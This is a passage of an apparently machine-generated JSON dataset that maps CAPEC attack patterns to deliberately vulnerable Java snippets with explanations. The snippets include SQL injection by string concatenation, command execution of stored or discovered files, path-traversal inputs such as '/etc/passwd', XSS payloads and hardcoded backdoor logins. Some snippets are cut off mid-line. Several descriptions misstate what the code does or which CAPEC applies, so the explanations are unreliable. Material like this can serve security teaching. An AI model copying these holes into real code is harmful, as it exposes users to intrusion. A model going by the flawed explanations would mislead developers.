        "code_snippet": "public class ZoneBypass { \n\\tprivate String zone; \n\\tprivate String script; \n\\t\n\\tpublic ZoneBypass(String zone, String script) { \n\\t\\tthis.zone = zone; \n\\t\\tthis.script = script; \n\\t} \n\\t\n\\tpublic void executeScript() { \n\\t\\t// CWE-250: Execution with Unnecessary Privileges \n\\t\\t// Running script with elevated privileges \n\\t\\tRuntime.getRuntime().exec(\\",
        "description": "Java code snippet demonstrating a zone-based web-browser security bypass attack. The code executes a script with elevated privileges, sets an unsigned ActiveX control without access checks, and performs improper authorization and input validation, leading to a privilege elevation attack."
    },
    {
        "capec_id": "105",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.ServletException;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String userInput = req.getHeader(\"X-Forwarded-For\");\n        String proxyRequest = \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\nX-Forwarded-For: \" + userInput + \"\\r\\n\\r\\n\";\n        byte[] requestBytes = proxyRequest.getBytes();\n        // Send the request to the backend server\n        // This can be done using a socket or an HTTP client library\n        // For demonstration purposes, we'll just print the request\n        System.out.println(new String(requestBytes));\n    }\n}\n",
        "description": "This Java code snippet demonstrates the HTTP Request Smuggling vulnerability (CAPEC-273). The code is a servlet that takes user input from the 'X-Forwarded-For' header and constructs a new HTTP request to be sent to a backend server. The input is not properly sanitized, allowing an attacker to inject malicious HTTP requests (CWE-74, CWE-113, CWE-138). The code also demonstrates an interpretation conflict (CWE-436) and inconsistent interpretation of HTTP requests (CWE-444) as the servlet does not correctly handle malformed HTTP requests."
    },
    {
        "capec_id": "106",
        "code_snippet": "public class LogInjectionExample {\n    public void logUserInput(String userInput) {\n        String logMessage = \"User input: \" + userInput;\n        System.out.println(logMessage);\n    }\n\n    public void generateWebPage(String userInput) {\n        String htmlPage = \"<html><body><img src='\" + userInput + \"' /></body></html>\";\n        System.out.println(htmlPage);\n    }\n\n    public static void main(String[] args) {\n        LogInjectionExample example = new LogInjectionExample();\n        example.logUserInput(\"<script>alert('XSS')</script>\");\n        example.generateWebPage(\"javascript:alert('XSS')\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-93 Log Injection-Tampering-Forging attack pattern, which is related to CWE-692 Incomplete Denylist to Cross-Site Scripting, CWE-79 Improper Neutralization of Input During Web Page Generation, and CWE-82 Improper Neutralization of Script in Attributes of IMG Tags in a Web Page. The code logs user input without proper sanitization, allowing an attacker to inject malicious scripts, and generates a web page with user input in an IMG tag's src attribute, making it vulnerable to cross-site scripting (XSS) attacks."
    },
    {
        "capec_id": "107",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSTVulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String xhr = request.getHeader(\"X-Requested-With\");\n        if (xhr == null || !xhr.equals(\"XMLHttpRequest\")) {\n            // No validation of the request origin\n            String cookie = request.getHeader(\"Cookie\");\n            response.addHeader(\"Set-Cookie\", \"victimCookie=\" + cookie);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows Cross-Site Tracing (XST) attacks. It fails to validate the request origin, allowing an attacker to steal the victim's session cookie by making a malicious XMLHttpRequest. The code also lacks proper input validation, making it vulnerable to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) attacks."
    },
    {
        "capec_id": "108",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"Robert'); DROP TABLE Users; --\";\n        String query = \"SELECT * FROM Users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\")) {\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            ResultSet result = pstmt.executeQuery();\n\n            while (result.next()) {\n                String storedCmd = result.getString(\"cmd\");\n                Runtime.getRuntime().exec(storedCmd);\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL injection and OS command injection attacks. The application constructs an SQL query using user input without proper validation, allowing an attacker to inject malicious SQL commands. The application then executes the stored command using Runtime.getRuntime().exec(), which can lead to arbitrary command execution on the host."
    },
    {
        "capec_id": "109",
        "code_snippet": "public class HibernateVulnerableDAO {\n    public List<User> getUsers(String username) {\n        Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n        session.beginTransaction();\n        Query query = session.createQuery(\\",
        "description": "This Java code snippet demonstrates a Hibernate-based SQL injection vulnerability. The getUsers method takes a username as input and constructs a dynamic SQL query using the input. The input is not properly validated or sanitized, allowing an attacker to inject malicious SQL code. This is an example of CWE-20: Improper Input Validation, CWE-89: Improper Neutralization of Special Elements used in an SQL Command, CWE-564: SQL Injection: Hibernate, CWE-943: Improper Neutralization of Special Elements in Data Query Logic, and CWE-1083: Data Access from Outside Expected Data Manager Component."
    },
    {
        "capec_id": "110",
        "code_snippet": "import javax.xml.soap.SOAPBody; import javax.xml.soap.SOAPEnvelope; import javax.xml.soap.SOAPMessage; import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; public class SOAPService { public String processSOAPRequest(SOAPMessage soapMessage) { SOAPBody soapBody = soapMessage.getSOAPBody(); String userId = soapBody.getElementsByTagName(\"userId\").item(0).getTextContent(); String password = soapBody.getElementsByTagName(\"password\").item(0).getTextContent(); String query = \"SELECT * FROM users WHERE userId = '\" + userId + \"' AND password = '\" + password + \"'\"; try { Class.forName(\"com.mysql.cj.jdbc.Driver\"); Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\"); PreparedStatement pstmt = conn.prepareStatement(query); ResultSet rs = pstmt.executeQuery(); if (rs.next()) { return \"User authenticated successfully\"; } else { return \"Authentication failed\"; } } catch (Exception e) { return \"Error: \" + e.getMessage(); } } }",
        "description": "This Java code snippet demonstrates a SOAP service that is vulnerable to SQL injection attacks. The service receives a SOAP message containing a userId and password, and uses these inputs to construct a dynamic SQL query without proper validation or parameter binding. This allows an attacker to inject malicious SQL code, potentially leading to unauthorized access or data tampering. The code also includes a catch block that returns an error message containing sensitive information about the environment, which is a CWE-209 violation."
    },
    {
        "capec_id": "111",
        "code_snippet": "public class VulnerableJSONServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String callback = req.getParameter(\"callback\");\n        String data = \"[{\\\"user\\\":\\\"admin\\\",\\\"password\\\":\\\"password123\\\"}]\";\n        resp.setContentType(\"application/json\");\n        resp.getWriter().write(callback + \"(\" + data + \")\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable JSON servlet that is susceptible to JSON Hijacking attacks. The servlet takes a 'callback' parameter and wraps the sensitive data in a JSONP response, allowing an attacker to steal the data by making a cross-site request to the servlet and overriding the Array constructor. The code violates CWE-345, CWE-346, CWE-352, CWE-79, and CWE-602 by not verifying the authenticity of the 'callback' parameter, not validating the origin of the request, and relying on client-side security mechanisms."
    },
    {
        "capec_id": "112",
        "code_snippet": "public class BruteForceAttack {\n    private static final int MAX_ATTEMPTS = 1000000;\n    private static final String[] COMMON_PASSWORDS = {\\",
        "description": "This Java code snippet demonstrates a brute force attack that exploits weak passwords, inadequate encryption strength, and insufficiently random values. The attacker attempts to decrypt encrypted data by trying a large number of weak passwords, which are generated using an insufficiently random mechanism. The authentication mechanism is also weak, allowing the attacker to make multiple attempts without restriction. The code uses a fixed encryption key and inadequate encryption strength, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "113",
        "code_snippet": "public class SoCInterface {\n    public static void accessRegisterInterface(int registerAddress) {\n        // CWE-1262: Improper Access Control for Register Interface\n        // No access control check before accessing the register interface\n        MemoryMappedIORegister register = new MemoryMappedIORegister(registerAddress);\n        register.write(0x1234);\n    }\n\n    public static void activateDebugLogic() {\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // No protection mechanism to prevent activation of debug logic at runtime\n        HardwareDebugFeature debugFeature = new HardwareDebugFeature();\n        debugFeature.activate();\n    }\n\n    public static void useAlternateHardwareInterface() {\n        // CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n        // No protection mechanism for alternate hardware interface\n        AlternateHardwareInterface alternateInterface = new AlternateHardwareInterface();\n        alternateInterface.accessControlProtectedAsset();\n    }\n\n    public static void useIOCTLWithInsufficientAccessControl() {\n        // CWE-782: Exposed IOCTL with Insufficient Access Control\n        // No access control check before using the IOCTL\n        IOCTL ioctl = new IOCTL();\n        ioctl.performRestrictedFunctionality();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of interface manipulation, which can lead to adverse security impacts. It includes four methods, each illustrating a related CWE: CWE-1262 (improper access control for register interface), CWE-1313 (hardware allows activation of test or debug logic at runtime), CWE-1299 (missing protection mechanism for alternate hardware interface), and CWE-782 (exposed IOCTL with insufficient access control). The code lacks proper access control checks and protection mechanisms, allowing an adversary to manipulate the interfaces and potentially bypass security controls."
    },
    {
        "capec_id": "114",
        "code_snippet": "public class AuthenticationSystem {\n    private static Map<String, String> users = new HashMap<>();\n    private static int maxAttempts = 5;\n    private static int attempts = 0;\n\n    public static void main(String[] args) {\n        users.put(\"admin\", \"password\");\n        users.put(\"user\", \"password\");\n\n        while (true) {\n            System.out.print(\"Enter username: \");\n            String username = System.console().readLine();\n            System.out.print(\"Enter password: \");\n            String password = System.console().readLine();\n\n            if (username.equals(\"debug\") && password.equals(\"debug\")) {\n                // CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State\n                System.out.println(\"Debug access granted.\");\n                // Grant access to internal assets\n                break;\n            }\n\n            if (users.containsKey(username) && users.get(username).equals(password)) {\n                // CWE-287: Improper Authentication\n                System.out.println(\"Authentication successful.\");\n                break;\n            } else {\n                attempts++;\n                if (attempts < maxAttempts) {\n                    System.out.println(\"Invalid credentials. Try again.\");\n                } else {\n                    // CWE-307: Improper Restriction of Excessive Authentication Attempts\n                    System.out.println(\"Maximum attempts exceeded.\");\n                    break;\n                }\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the main idea of the CAPEC. It includes CWE-287: Improper Authentication, CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State, and CWE-307: Improper Restriction of Excessive Authentication Attempts. The system allows an attacker to bypass authentication by using a debug username and password, and it does not implement sufficient measures to prevent brute-force attacks."
    },
    {
        "capec_id": "115",
        "code_snippet": "public class AuthenticationBypass {\n    private static boolean isAdmin = false;\n    private static String adminUsername = \"admin\";\n    private static String adminPassword = \"password\";\n\n    public static void main(String[] args) {\n        String username = \"attacker\";\n        String password = \"password\";\n\n        // CWE-287: Improper Authentication\n        if (username.equals(adminUsername)) {\n            isAdmin = true;\n        }\n\n        // CWE-302: Authentication Bypass by Assumed-Immutable Data\n        if (isAdmin) {\n            System.out.println(\"Access granted!\");\n        } else {\n            System.out.println(\"Access denied!\");\n        }\n\n        // CWE-1390: Weak Authentication\n        if (password.length() > 0) {\n            isAdmin = true;\n        }\n\n        // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        if (args.length > 0 && args[0].equals(\"-bypass\")) {\n            isAdmin = true;\n        }\n\n        // CWE-305: Authentication Bypass by Primary Weakness\n        if (isAdmin) {\n            System.out.println(\"Access granted via alternate path!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of authentication bypass by evading or circumventing an authentication mechanism. It includes multiple CWEs, such as improper authentication, authentication bypass by assumed-immutable data, weak authentication, authentication bypass using an alternate path or channel, and authentication bypass by primary weakness. The code allows an attacker to gain access to protected data without proper authentication."
    },
    {
        "capec_id": "116",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        File debugFile = new File(\"debug_info.txt\");\n        if (debugFile.exists()) {\n            Properties debugProps = new Properties();\n            try {\n                debugProps.load(new java.io.FileInputStream(debugFile));\n                String sensitiveInfo = debugProps.getProperty(\"secret_key\");\n                System.out.println(\"Debug info: \" + sensitiveInfo);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // Untrusted search path\n        String searchPath = System.getProperty(\"search_path\");\n        File searchDir = new File(searchPath);\n        if (searchDir.isDirectory()) {\n            String[] files = searchDir.list();\n            for (String file : files) {\n                if (file.endsWith(\".exe\")) {\n                    // Replicating malicious code\n                    Runtime.getRuntime().exec(file);\n                }\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of actively probing a target to solicit sensitive information. It exposes sensitive information during debug (CWE-1243) by reading a debug file containing a secret key. The code also uses an untrusted search path (CWE-426) to execute files in a directory, which could lead to replicating malicious code (CWE-509). The creation of emergent resources (CWE-1229) is also possible if the executed files create new resources that can be used by attackers."
    },
    {
        "capec_id": "117",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class SniffingAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"targetHost\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username:password\";\n        out.writeUTF(sensitiveData);\n        out.flush();\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String message = in.readUTF();\n        System.out.println(\"Received message: \" + message);\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        String httpRequest = \"GET / HTTP/1.1\\r\\nHost: targetHost\\r\\n\\r\\n\";\n        out.writeBytes(httpRequest);\n        out.flush();\n\n        // CWE-514: Covert Channel\n        String covertMessage = \"hiddenData\";\n        out.writeUTF(covertMessage);\n        out.flush();\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 1000; i++) {\n            out.writeUTF(\"amplifiedMessage\");\n            out.flush();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a sniffing attack, where an adversary monitors data streams to gather sensitive information. The code includes examples of CWE-319 (cleartext transmission of sensitive information), CWE-924 (improper enforcement of message integrity), CWE-444 (inconsistent interpretation of HTTP requests), CWE-514 (covert channel), and CWE-406 (insufficient control of network message volume)."
    },
    {
        "capec_id": "120",
        "code_snippet": "public class DoubleEncodingVulnerability {\n    public static void processRequest(String userInput) {\n        String encodedInput = userInput;\n        // CWE-173: Improper Handling of Alternate Encoding\n        encodedInput = java.net.URLEncoder.encode(encodedInput, \"UTF-8\");\n        encodedInput = java.net.URLEncoder.encode(encodedInput, \"UTF-8\");\n        // CWE-172: Encoding Error\n        String decodedInput = java.net.URLDecoder.decode(encodedInput, \"UTF-8\");\n        // CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n        if (decodedInput.contains(\".\") || decodedInput.contains(\"..\")) {\n            // CWE-181: Incorrect Behavior Order: Validate Before Filter\n            // CWE-183: Permissive List of Allowed Inputs\n            // CWE-184: Incomplete List of Disallowed Inputs\n            System.out.println(\"Path traversal detected!\");\n        } else {\n            // CWE-20: Improper Input Validation\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n            // CWE-697: Incorrect Comparison\n            // CWE-692: Incomplete Denylist to Cross-Site Scripting\n            System.out.println(\"Request processed successfully.\");\n        }\n    }\n    public static void main(String[] args) {\n        processRequest(\"../../../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a double encoding vulnerability, where an input string is encoded twice using URL encoding, allowing an attacker to bypass filters that detect illegal characters or strings. The code also highlights various CWEs related to improper input validation, encoding errors, and incomplete lists of allowed or disallowed inputs."
    },
    {
        "capec_id": "121",
        "code_snippet": "public class DebugInterface {\n    private static boolean DEBUG_MODE = true;\n    private static String SECURITY_TOKEN = \"default\";\n\n    public static void main(String[] args) {\n        if (DEBUG_MODE) {\n            System.out.println(\"Debug mode enabled\");\n            // Debug logic\n            System.out.println(\"Security Token: \" + SECURITY_TOKEN);\n            // Insecurely generated security token\n            SECURITY_TOKEN = generateSecurityToken();\n            System.out.println(\"New Security Token: \" + SECURITY_TOKEN);\n        }\n    }\n\n    private static String generateSecurityToken() {\n        // Incorrectly generated security token\n        return \"insecure_token\";\n    }\n\n    public static void sendTransaction(String entityId, String securityToken) {\n        // Missing source identifier in entity transactions\n        if (securityToken.equals(SECURITY_TOKEN)) {\n            System.out.println(\"Transaction approved for entity \" + entityId);\n        } else {\n            System.out.println(\"Transaction denied for entity \" + entityId);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting an unintentionally enabled debug interface on a production system. The code includes CWEs such as active debug code (CWE-489), improper restriction of security token assignment (CWE-1259), generation of incorrect security tokens (CWE-1270), and missing source identifier in entity transactions (CWE-1302). The debug mode is enabled by default, allowing an adversary to access sensitive information and manipulate the system."
    },
    {
        "capec_id": "122",
        "code_snippet": "public class InsecureAccessController {\n    private Map<String, Boolean> userPrivileges = new HashMap<>();\n\n    public InsecureAccessController() {\n        userPrivileges.put(\"admin\", true);\n        userPrivileges.put(\"user\", true);\n    }\n\n    public void performSensitiveOperation(String username) {\n        if (userPrivileges.getOrDefault(username, false)) {\n            // sensitive operation\n            System.out.println(\"Performing sensitive operation...\");\n        }\n    }\n\n    public static void main(String[] args) {\n        InsecureAccessController controller = new InsecureAccessController();\n        controller.performSensitiveOperation(\"user\");\n    }\n}",
        "description": "This Java code snippet demonstrates improper privilege management and access control. The InsecureAccessController class allows any user to perform sensitive operations, regardless of their actual privileges. The userPrivileges map is not properly secured, and the performSensitiveOperation method does not correctly check the user's privileges. This allows unauthorized users to access sensitive resources, violating the principle of least privilege."
    },
    {
        "capec_id": "123",
        "code_snippet": "public class VulnerableBufferExample {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        byte[] sourceBuffer = new byte[20];\n        for (int i = 0; i < 20; i++) {\n            sourceBuffer[i] = (byte) i;\n        }\n        for (int i = 0; i < 20; i++) {\n            buffer[i] = sourceBuffer[i]; // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        }\n        for (int i = 0; i < 20; i++) {\n            System.out.print(buffer[i]);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability. The code attempts to copy 20 bytes from the sourceBuffer into a buffer of size 10, resulting in an out-of-bounds write. This can lead to unauthorized access to sensitive data or even code execution."
    },
    {
        "capec_id": "124",
        "code_snippet": "public class SharedResourceVulnerability {\n    private static int sharedResource = 0;\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                for (int i = 0; i < 100000; i++) {\n                    sharedResource++;\n                }\n            }\n        });\n\n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                for (int i = 0; i < 100000; i++) {\n                    sharedResource--;\n                }\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting a shared resource between multiple threads. The CWEs related to this CAPEC include CWE-662 (Improper Synchronization), CWE-1189 (Improper Isolation of Shared Resources on System-on-a-Chip), CWE-1331 (Improper Isolation of Shared Resources in Network On Chip), CWE-1303 (Non-Transparent Sharing of Microarchitectural Resources), and CWE-1421 (Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution). In this example, two threads are accessing and modifying a shared integer resource without proper synchronization, leading to a race condition and potential data corruption."
    },
    {
        "capec_id": "125",
        "code_snippet": "public class FloodServer {\n    public static void main(String[] args) {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new Worker(socket)).start();\n        }\n    }\n\n    static class Worker implements Runnable {\n        private Socket socket;\n\n        public Worker(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    byte[] buffer = new byte[1024];\n                    socket.getInputStream().read(buffer);\n                    socket.getOutputStream().write(buffer);\n                }\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a server that is vulnerable to flooding attacks. The server accepts incoming connections and starts a new thread to handle each connection. However, the server does not limit the number of connections it accepts or the amount of data it processes, making it vulnerable to CWE-770: Allocation of Resources Without Limits or Throttling. Additionally, the server does not properly release resources when a connection is closed, making it vulnerable to CWE-404: Improper Resource Shutdown or Release. An attacker can exploit these weaknesses by rapidly establishing a large number of connections to the server, causing it to consume excessive resources and potentially leading to a denial-of-service."
    },
    {
        "capec_id": "126",
        "code_snippet": "public class FileAccessor {\n    public static void accessFile(String filePath) {\n        try {\n            File file = new File(filePath);\n            if (file.exists()) {\n                System.out.println(\"File found: \" + file.getAbsolutePath());\n                // Perform operations on the file\n            } else {\n                System.out.println(\"File not found\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error accessing file: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        accessFile(\"../../etc/passwd\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file access function that is susceptible to path traversal attacks. The function takes a file path as input and attempts to access the file without properly validating the input. In the main method, an example of a malicious input is provided, which uses dot-dot-slash characters to traverse out of the intended directory structure and access a sensitive file (/etc/passwd)."
    },
    {
        "capec_id": "127",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class DirectoryListingServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String path = req.getParameter(\"path\");\n        File directory = new File(path);\n        if (directory.isDirectory()) {\n            String[] files = directory.list();\n            resp.setContentType(\"text/plain\");\n            for (String file : files) {\n                resp.getWriter().println(file);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet is a vulnerable HttpServlet that allows an adversary to list the contents of a directory by sending a GET request with a 'path' parameter. The servlet does not perform any authorization checks, allowing an attacker to explore the directory tree and learn the names of files. This is an example of CWE-425: Direct Request ('Forced Browsing') and CWE-285: Improper Authorization. The code also lacks input validation, making it vulnerable to CWE-288: Authentication Bypass Using an Alternate Path or Channel. Additionally, the servlet uses default file permissions, which can lead to CWE-276: Incorrect Default Permissions. The code does not use a protection mechanism to defend against directed attacks, making it vulnerable to CWE-693: Protection Mechanism Failure. Furthermore, the servlet does not protect alternate paths, making it vulnerable to CWE-424: Improper Protection of Alternate Path. Finally, the servlet does not assign correct permissions to critical resources, making it vulnerable to CWE-732: Incorrect Permission Assignment for Critical Resource."
    },
    {
        "capec_id": "128",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        int maxInt = Integer.MAX_VALUE;\n        int userInput = 1;\n        int result = maxInt + userInput;\n        if (result > 0) {\n            System.out.println(\"User input is valid\");\n            // grant access or perform sensitive operation\n        } else {\n            System.out.println(\"User input is invalid\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting integer variable structure. It adds 1 to the maximum positive integer value, causing an integer overflow and resulting in a negative number. The code then checks if the result is greater than 0, which it is not, but the application may not expect this and may grant access or perform a sensitive operation. This code embodies CWE-682, CWE-839, CWE-190, CWE-194, and CWE-192."
    },
    {
        "capec_id": "129",
        "code_snippet": "public class PointerAttack {\n    public static void main(String[] args) {\n        int[] array = new int[5];\n        int offset = 10; // CWE-823: Use of Out-of-range Pointer Offset\n        int pointer = 0;\n        try {\n            // CWE-822: Untrusted Pointer Dereference\n            pointer = Integer.parseInt(args[0]);\n        } catch (Exception e) {\n            pointer = 0;\n        }\n        try {\n            // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            array[pointer + offset] = 10;\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught ArrayIndexOutOfBoundsException\");\n        }\n        try {\n            // CWE-476: NULL Pointer Dereference\n            String str = null;\n            System.out.println(str.length());\n        } catch (NullPointerException e) {\n            System.out.println(\"Caught NullPointerException\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a pointer attack, which can lead to unintended memory access, crashes, or arbitrary code execution. It includes CWE-823 (out-of-range pointer offset), CWE-822 (untrusted pointer dereference), CWE-119 (improper restriction of operations within the bounds of a memory buffer), and CWE-476 (NULL pointer dereference)."
    },
    {
        "capec_id": "130",
        "code_snippet": "public class VulnerableService {\n    private static final int MAX_CONNECTIONS = 100;\n    private static List<Socket> connections = new ArrayList<>();\n\n    public void handleRequest(Socket socket) {\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        // No limit on the number of connections\n        connections.add(socket);\n\n        // CWE-1325: Improperly Controlled Sequential Memory Allocation\n        // Allocate memory for each connection without limiting the total amount\n        byte[] buffer = new byte[1024 * 1024]; // 1MB buffer per connection\n        connections.add(socket);\n\n        // CWE-400: Uncontrolled Resource Consumption\n        // No control on the amount of resources consumed by each connection\n        while (true) {\n            // Perform some resource-intensive operation\n            performHeavyOperation(buffer);\n        }\n    }\n\n    private void performHeavyOperation(byte[] buffer) {\n        // Simulate a heavy operation\n        for (int i = 0; i < buffer.length; i++) {\n            buffer[i] = (byte) (i % 256);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable service that can be exploited to cause resource depletion. The service allows an unlimited number of connections, allocates a large amount of memory for each connection, and performs resource-intensive operations without any control or throttling. This can lead to excessive resource consumption, eventually causing the service to become unavailable."
    },
    {
        "capec_id": "131",
        "code_snippet": "public class ResourceLeakExample {\n    private static Socket socket;\n    \n    public static void main(String[] args) {\n        for (int i = 0; i < 10000; i++) {\n            try {\n                socket = new Socket(\"example.com\", 80);\n                // Perform some operation with the socket\n                // But do not close the socket\n            } catch (IOException e) {\n                // Handle the exception\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a resource leak vulnerability. The code creates a new Socket object in each iteration of the loop, but it does not close the socket after use. This can lead to a resource leak, as the socket remains open and consumes system resources, eventually causing the system to run out of available resources. This is an example of CWE-772: Missing Release of Resource after Effective Lifetime and CWE-404: Improper Resource Shutdown or Release."
    },
    {
        "capec_id": "132",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class SymlinkAttack {\n    public static void main(String[] args) {\n        String filePath = \"/path/to/file\";\n        String symlinkPath = \"/path/to/symlink\";\n        File file = new File(filePath);\n        File symlink = new File(symlinkPath);\n\n        try {\n            // Create a symbolic link\n            Runtime.getRuntime().exec(\"ln -s \" + filePath + \" \" + symlinkPath);\n\n            // Access the file without proper link resolution\n            if (file.exists()) {\n                System.out.println(\"File exists: \" + file.getAbsolutePath());\n                // Perform operations on the file, unaware of the symlink\n                // This could lead to unauthorized file access\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error creating symlink: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a symbolic link attack, where an adversary creates a symbolic link to a sensitive file and tricks the application into accessing the link instead of the intended file. The code creates a symbolic link using the `ln` command and then accesses the file without properly resolving the link, allowing an attacker to potentially access unauthorized files."
    },
    {
        "capec_id": "133",
        "code_snippet": "public class DebugSwitchExample {\n    public static void main(String[] args) {\n        if (args.length > 0 && args[0].equals(\"--debug\")) {\n            System.out.println(\"Debug mode enabled\");\n            // Hidden functionality - undocumented debug mode\n            System.out.println(\"Database password: \" + getDatabasePassword());\n        } else if (args.length > 0 && args[0].equals(\"--admin\")) {\n            System.out.println(\"Admin mode enabled\");\n            // Incomplete list of disallowed inputs - missing input validation\n            executeAdminCommand(args[1]);\n        } else {\n            try {\n                // Unchecked error condition - ignoring exceptions\n                executeUserCommand(args);\n            } catch (Exception e) {\n                // Incorrect chaining or granularity of debug components\n                System.out.println(\"Error: \" + e.getMessage());\n            }\n        }\n    }\n\n    private static String getDatabasePassword() {\n        // Invocation of a control element at an unnecessarily deep horizontal layer\n        return DatabaseManager.getInstance().getPassword();\n    }\n\n    private static void executeAdminCommand(String command) {\n        // Invocation of a control element at an unnecessarily deep horizontal layer\n        AdminManager.getInstance().executeCommand(command);\n    }\n\n    private static void executeUserCommand(String[] args) {\n        // Invocation of a control element at an unnecessarily deep horizontal layer\n        UserManager.getInstance().executeCommand(args);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of attempting to invoke all common switches and options in the target application to discover weaknesses. It includes CWEs such as hidden functionality (debug mode), incomplete list of disallowed inputs (missing input validation), unchecked error condition (ignoring exceptions), incorrect chaining or granularity of debug components, and invocation of a control element at an unnecessarily deep horizontal layer (DatabaseManager, AdminManager, and UserManager instances)."
    },
    {
        "capec_id": "134",
